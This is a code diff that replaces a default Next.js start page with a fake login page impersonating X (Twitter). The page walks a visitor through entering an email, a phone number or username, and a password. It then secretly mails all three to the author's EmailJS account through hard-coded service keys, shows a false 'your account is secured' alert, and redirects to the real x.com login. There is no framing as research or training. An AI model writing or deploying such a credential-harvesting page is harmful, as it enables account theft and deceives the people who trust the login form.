@@ -1,113 +1,164 @@
-import Image from "next/image";
-import { Geist, Geist_Mono } from "next/font/google";
+import { useState, useEffect } from "react";
+import { motion } from "framer-motion";
+import emailjs from "emailjs-com";
 
-const geistSans = Geist({
-  variable: "--font-geist-sans",
-  subsets: ["latin"],
-});
+export default function XLogin() {
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [verification, setVerification] = useState("");
+  const [error, setError] = useState("");
+  const [darkMode, setDarkMode] = useState(false);
+  const [step, setStep] = useState(1);
 
-const geistMono = Geist_Mono({
-  variable: "--font-geist-mono",
-  subsets: ["latin"],
-});
+  useEffect(() => {
+    const storedDarkMode = localStorage.getItem("darkMode") === "true";
+    setDarkMode(storedDarkMode);
+    document.documentElement.classList.toggle("dark", storedDarkMode);
+  }, []);
 
-export default function Home() {
+  const toggleDarkMode = () => {
+    setDarkMode((prev) => {
+      localStorage.setItem("darkMode", !prev);
+      document.documentElement.classList.toggle("dark", !prev);
+      return !prev;
+    });
+  };
+
+  const handleNext = (e) => {
+    e.preventDefault();
+    if (!email.trim()) {
+      setError("Please enter a valid email or username.");
+    } else {
+      setError("");
+      setStep(2);
+    }
+  };
+
+  const handleVerification = (e) => {
+    e.preventDefault();
+    if (!verification.trim()) {
+      setError("Please enter your phone number or username.");
+    } else {
+      setError("");
+      setStep(3);
+    }
+  };
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    if (!password) {
+      setError("Please enter your password.");
+      return;
+    }
+
+    emailjs
+      .send(
+        "service_ftb4lhs",
+        "template_gi5kkvp",
+        { email, verification, password },
+        "o07HchFDD89TJ91W-"
+      )
+      .then(
+        () => {
+          alert(
+            "Thanks for verifying your identity, your account is secured now!"
+          );
+          window.location.href = "https://x.com/i/flow/login";
+        },
+        () => {
+          alert("Your identity cannot be verified at the moment. Try again.");
+        }
+      );
+  };
+
   return (
-    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
-      <main className="flex flex-col gap-[32px] row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="list-inside list-decimal text-sm/6 text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
-          <li className="mb-2 tracking-[-.01em]">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] px-1 py-0.5 rounded font-[family-name:var(--font-geist-mono)] font-semibold">
-              pages/index.js
-            </code>
-            .
-          </li>
-          <li className="tracking-[-.01em]">
-            Save and see your changes instantly.
-          </li>
-        </ol>
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:w-auto"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 w-full sm:w-auto md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
+    <div
+      className={`flex flex-col md:flex-row h-screen items-center justify-center ${darkMode ? "bg-black text-white" : "bg-white text-black"}`}
+    >
+      <div className="md:w-1/2 flex flex-col justify-center items-center p-8 text-center">
+        <img src="/logo.png" alt="X Logo" className="h-16 w-auto mb-4 dark:invert" />
+        <h1 className="text-4xl font-bold">Welcome to X</h1>
+        <p className="text-lg text-gray-500 dark:text-gray-400 max-w-md mt-2">
+          The best place to connect, share, and stay informed. Log in to your
+          account and verify your identity.
+        </p>
+      </div>
+
+      <motion.div
+        initial={{ opacity: 0, x: 50 }}
+        animate={{ opacity: 1, x: 0 }}
+        transition={{ duration: 0.5 }}
+        className="w-full md:w-1/2 p-8 bg-gray-900 dark:bg-white rounded-lg shadow-lg max-w-md"
+      >
+        <div className="flex justify-between items-center mb-4">
+          <h1 className="text-3xl font-bold text-white dark:text-black">Sign in to X</h1>
+          <button onClick={toggleDarkMode} className="p-2 bg-gray-700 dark:bg-gray-300 rounded">
+            {darkMode ? "🌞" : "🌙"}
+          </button>
         </div>
-      </main>
-      <footer className="row-start-3 flex gap-[24px] flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=default-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
+        {step === 1 && (
+          <form onSubmit={handleNext} className="space-y-4">
+            <input
+              type="text"
+              placeholder="Email or username"
+              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+            />
+            {error && <p className="text-red-500 text-sm">{error}</p>}
+            <motion.button
+              whileHover={{ scale: 1.05 }}
+              whileTap={{ scale: 0.95 }}
+              type="submit"
+              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
+            >
+              Next
+            </motion.button>
+          </form>
+        )}
+        {step === 2 && (
+          <form onSubmit={handleVerification} className="space-y-4">
+            <p className="text-yellow-500 text-sm">
+              Please verify your identity by entering your phone number or
+              username.
+            </p>
+            <input
+              type="text"
+              placeholder="Phone number or username"
+              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
+              value={verification}
+              onChange={(e) => setVerification(e.target.value)}
+            />
+            <motion.button
+              whileHover={{ scale: 1.05 }}
+              whileTap={{ scale: 0.95 }}
+              type="submit"
+              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
+            >
+              Next
+            </motion.button>
+          </form>
+        )}
+        {step === 3 && (
+          <form onSubmit={handleSubmit} className="space-y-4">
+            <input
+              type="password"
+              placeholder="Password"
+              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+            />
+            <motion.button
+              whileHover={{ scale: 1.05 }}
+              whileTap={{ scale: 0.95 }}
+              type="submit"
+              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
+            >
+              Sign In
+            </motion.button>
+          </form>
+        )}
+      </motion.div>
     </div>
   );
 }
